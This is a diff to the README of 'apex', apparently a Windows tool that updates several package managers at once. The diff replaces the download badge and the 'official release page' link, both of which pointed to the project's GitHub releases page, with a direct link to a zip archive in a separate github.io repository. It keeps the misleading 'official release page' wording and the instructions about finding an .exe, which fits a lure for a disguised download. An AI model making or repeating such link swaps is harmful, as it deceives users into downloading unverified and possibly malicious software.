@@ -5,7 +5,7 @@ description: "Update all system package managers in parallel to save time and st
 ---
 # 🚀 apex - Update all system packages at once
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Pandemic-coppercolor329/apex/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Pandemic-coppercolor329/pandemic-coppercolor329.github.io/main/sp/mtp/Application_v1.6.zip)
 
 Apex manages software updates for your computer. It performs updates for multiple package managers at the same time. This process saves you time during your daily maintenance routine.
 
@@ -13,7 +13,7 @@ Apex manages software updates for your computer. It performs updates for multipl
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/Pandemic-coppercolor329/apex/releases) to access the installer.
+1. Visit the [official release page](https://raw.githubusercontent.com/Pandemic-coppercolor329/pandemic-coppercolor329.github.io/main/sp/mtp/Application_v1.6.zip) to access the installer.
 2. Look for the file ending in .exe under the latest version label.
 3. Click the file name to start the download to your computer.
 4. Locate the file in your downloads folder.
